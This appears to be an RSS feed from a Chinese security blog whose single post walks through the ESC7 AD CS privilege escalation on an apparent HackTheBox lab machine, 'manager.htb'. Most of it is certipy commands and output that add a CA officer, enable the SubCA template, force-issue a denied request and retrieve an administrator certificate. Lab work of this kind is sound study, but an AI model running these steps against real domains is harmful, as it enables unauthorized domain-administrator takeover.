<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>竹林寺</title>
        <link>http://example.com</link>
        <description>请我喝咖啡！ψ(｀∇´)ψ</description>
        <language>zh-CN</language>
        <pubDate>Wed, 24 Jan 2024 01:20:34 +0800</pubDate>
        <lastBuildDate>Wed, 24 Jan 2024 01:20:34 +0800</lastBuildDate>
        <category>权限维持</category>
        <category>我的博客</category>
        <category>域控提权</category>
        <item>
            <guid isPermalink="true">http://example.com/2024/01/24/tools/%E5%9F%9F%E7%94%A8%E6%88%B7%E8%AF%81%E4%B9%A6%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83/</guid>
            <title>域控提权/域用户证书配置提权/ESC7</title>
            <link>http://example.com/2024/01/24/tools/%E5%9F%9F%E7%94%A8%E6%88%B7%E8%AF%81%E4%B9%A6%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83/</link>
            <category>域控提权</category>
            <pubDate>Wed, 24 Jan 2024 01:20:34 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;一使用场景&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一使用场景&#34;&gt;#&lt;/a&gt; 一。使用场景：&lt;/h2&gt;
&lt;h3 id=&#34;11需要有证书服务器adcs配置错误的域用户密码或hash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11需要有证书服务器adcs配置错误的域用户密码或hash&#34;&gt;#&lt;/a&gt; 1.1 需要有证书服务器 (ADCS)&amp;amp; 配置错误的域用户密码或 hash&lt;/h3&gt;
&lt;h2 id=&#34;二使用步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二使用步骤&#34;&gt;#&lt;/a&gt; 二。使用步骤：&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;(看使用步骤前，建议先看步骤三注意与踩坑)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;21查看域用户配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21查看域用户配置&#34;&gt;#&lt;/a&gt; 2.1. 查看域用户配置&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;拿到域用户的 hash 或密码后，用 &lt;code&gt;certipy&lt;/code&gt;  工具远程读取用户证书配置是否存在配置错误，如果有错误会显示漏洞存在且打出漏洞名称：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;certipy.exe find -u &lt;span class=&#34;string&#34;&gt;&amp;#x27;raven@manager.htb&amp;#x27;&lt;/span&gt; -p &lt;span class=&#34;string&#34;&gt;&amp;#x27;R4v3nBe5tD3veloP3r!123&amp;#x27;&lt;/span&gt; -dc-ip 10.10.11.236 -vulnerable -stdout&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;​		&lt;strong&gt;执行结果如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;PS D:\miniconda\Scripts&amp;gt; certipy.exe find -u &lt;span class=&#34;string&#34;&gt;&amp;#x27;raven@manager.htb&amp;#x27;&lt;/span&gt; -p &lt;span class=&#34;string&#34;&gt;&amp;#x27;R4v3nBe5tD3veloP3r!123&amp;#x27;&lt;/span&gt; -dc-ip 10.10.11.236 -vulnerable -stdout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Certipy v4.8.2 - by Oliver Lyak (ly4k)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Finding certificate templates&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Found 33 certificate templates&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Finding certificate authorities&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Found 1 certificate authority&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Found 11 enabled certificate templates&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Trying to get CA configuration &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager-DC01-CA&amp;#x27;&lt;/span&gt; via CSRA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Got CA configuration &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager-DC01-CA&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Enumeration output:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Certificate Authorities&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    CA Name                             : manager-DC01-CA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DNS Name                            : dc01.manager.htb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Certificate Validity Start          : 2023-07-27 10:21:05+00:00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Certificate Validity End            : 2122-07-27 10:31:04+00:00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Web Enrollment                      : Disabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    User Specified SAN                  : Disabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Request Disposition                 : Issue&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Enforce Encryption &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; Requests     : Enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Permissions&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      Owner                             : MANAGER.HTB\Administrators&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      Access Rights&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Enroll                          : MANAGER.HTB\Operator&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                          MANAGER.HTB\Authenticated Users&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                          MANAGER.HTB\Raven&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ManageCertificates              : MANAGER.HTB\Administrators&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                          MANAGER.HTB\Domain Admins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                          MANAGER.HTB\Enterprise Admins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ManageCa                        : MANAGER.HTB\Administrators&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                          MANAGER.HTB\Domain Admins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                          MANAGER.HTB\Enterprise Admins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                          MANAGER.HTB\Raven&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    [!] Vulnerabilities&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ESC7                              : &lt;span class=&#34;string&#34;&gt;&amp;#x27;MANAGER.HTB\\Raven&amp;#x27;&lt;/span&gt; has dangerous permissions&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Certificate Templates                   : [!] Could not find any certificate templates&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PS D:\miniconda\Scripts&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;22-拿到对应漏洞esc7进一步远程攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-拿到对应漏洞esc7进一步远程攻击&#34;&gt;#&lt;/a&gt; 2.2 拿到对应漏洞 (ESC7) 进一步远程攻击&lt;/h3&gt;
&lt;h4 id=&#34;221创建证书&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#221创建证书&#34;&gt;#&lt;/a&gt; 2.2.1. 创建证书&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;certipy.exe ca -ca &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager-DC01-CA&amp;#x27;&lt;/span&gt; -add-officer raven -username raven@manager.htb -password &lt;span class=&#34;string&#34;&gt;&amp;#x27;R4v3nBe5tD3veloP3r!123&amp;#x27;&lt;/span&gt; -dc-ip 10.10.11.236&lt;span class=&#34;string&#34;&gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;​				&lt;strong&gt;执行结果如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;PS D:\miniconda\Scripts&amp;gt; .\certipy.exe ca -ca &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager-DC01-CA&amp;#x27;&lt;/span&gt; -add-officer raven -username raven@manager.htb -password &lt;span class=&#34;string&#34;&gt;&amp;#x27;R4v3nBe5tD3veloP3r!123&amp;#x27;&lt;/span&gt; -dc-ip 10.10.11.236&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Certipy v4.8.2 - by Oliver Lyak (ly4k)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Successfully added officer &lt;span class=&#34;string&#34;&gt;&amp;#x27;Raven&amp;#x27;&lt;/span&gt; on &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager-DC01-CA&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PS D:\miniconda\Scripts&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;222启用证书模板&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#222启用证书模板&#34;&gt;#&lt;/a&gt; 2.2.2. 启用证书模板&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;certipy.exe ca -ca &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager-DC01-CA&amp;#x27;&lt;/span&gt; -enable-template SubCA -username raven@manager.htb -password &lt;span class=&#34;string&#34;&gt;&amp;#x27;R4v3nBe5tD3veloP3r!123&amp;#x27;&lt;/span&gt; -dc-ip 10.10.11.236&lt;span class=&#34;string&#34;&gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;​				&lt;strong&gt;执行结果如下:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;PS D:\miniconda\Scripts&amp;gt; .\certipy.exe ca -ca &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager-DC01-CA&amp;#x27;&lt;/span&gt; -enable-template SubCA -username raven@manager.htb -password &lt;span class=&#34;string&#34;&gt;&amp;#x27;R4v3nBe5tD3veloP3r!123&amp;#x27;&lt;/span&gt; -dc-ip 10.10.11.236&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Certipy v4.8.2 - by Oliver Lyak (ly4k)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Successfully enabled &lt;span class=&#34;string&#34;&gt;&amp;#x27;SubCA&amp;#x27;&lt;/span&gt; on &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager-DC01-CA&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PS D:\miniconda\Scripts&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;223请求证书但是会被拒绝拒绝后保存私钥和请求id&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#223请求证书但是会被拒绝拒绝后保存私钥和请求id&#34;&gt;#&lt;/a&gt; 2.2.3. 请求证书，但是会被拒绝，拒绝后保存私钥和请求 ID&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;certipy.exe req -username raven@manager.htb -password &lt;span class=&#34;string&#34;&gt;&amp;#x27;R4v3nBe5tD3veloP3r!123&amp;#x27;&lt;/span&gt; -ca &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager-DC01-CA&amp;#x27;&lt;/span&gt; -target manager.htb -template SubCA -upn administrator@manager.htb -dc-ip 10.10.11.236&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;​				&lt;strong&gt;执行结果如下:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;PS D:\miniconda\Scripts&amp;gt; certipy req -username raven@manager.htb -password &lt;span class=&#34;string&#34;&gt;&amp;#x27;R4v3nBe5tD3veloP3r!123&amp;#x27;&lt;/span&gt; -ca &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager-DC01-CA&amp;#x27;&lt;/span&gt; -target manager.htb -template SubCA -upn administrator@manager.htb -dc-ip 10.10.11.236&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Certipy v4.8.2 - by Oliver Lyak (ly4k)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Requesting certificate via RPC&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[-] Got error &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt; not allow the current user to enroll &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; this &lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt; of certificate.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Request ID is 26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Would you like to save the private key? (y/N) y&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Saved private key to 26.key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[-] Failed to request certificate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PS D:\miniconda\Scripts&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;224签发和批准证书&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#224签发和批准证书&#34;&gt;#&lt;/a&gt; 2.2.4. 签发和批准证书&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;certipy.exe ca -ca &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager-DC01-CA&amp;#x27;&lt;/span&gt; -issue-request 26 -username raven@manager.htb -password &lt;span class=&#34;string&#34;&gt;&amp;#x27;R4v3nBe5tD3veloP3r!123&amp;#x27;&lt;/span&gt; -dc-ip 10.10.11.236&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;​				&lt;strong&gt;执行结果如下:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;PS D:\miniconda\Scripts&amp;gt; .\certipy.exe ca -ca &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager-DC01-CA&amp;#x27;&lt;/span&gt; -issue-request 26 -username raven@manager.htb -password &lt;span class=&#34;string&#34;&gt;&amp;#x27;R4v3nBe5tD3veloP3r!123&amp;#x27;&lt;/span&gt; -dc-ip 10.10.11.236&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Certipy v4.8.2 - by Oliver Lyak (ly4k)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Successfully issued certificate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;225请求签发的证书id下载对应证书凭证文件administratorpfx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#225请求签发的证书id下载对应证书凭证文件administratorpfx&#34;&gt;#&lt;/a&gt; 2.2.5. 请求签发的证书 ID，下载对应证书凭证文件 (administrator.pfx)&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;certipy req -username raven@manager.htb -password &lt;span class=&#34;string&#34;&gt;&amp;#x27;R4v3nBe5tD3veloP3r!123&amp;#x27;&lt;/span&gt; -ca &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager-DC01-CA&amp;#x27;&lt;/span&gt; -target manager.htb -retrieve 26 -dc-ip 10.10.11.236&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;​				&lt;strong&gt;执行结果如下:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;PS D:\miniconda\Scripts&amp;gt; certipy req -username raven@manager.htb -password &lt;span class=&#34;string&#34;&gt;&amp;#x27;R4v3nBe5tD3veloP3r!123&amp;#x27;&lt;/span&gt; -ca &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager-DC01-CA&amp;#x27;&lt;/span&gt; -target manager.htb -retrieve 26 -dc-ip 10.10.11.236&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Certipy v4.8.2 - by Oliver Lyak (ly4k)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Rerieving certificate with ID 26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Successfully retrieved certificate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Got certificate with UPN &lt;span class=&#34;string&#34;&gt;&amp;#x27;administrator@manager.htb&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Certificate has no object SID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Loaded private key from &lt;span class=&#34;string&#34;&gt;&amp;#x27;26.key&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Saved certificate and private key to &lt;span class=&#34;string&#34;&gt;&amp;#x27;administrator.pfx&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
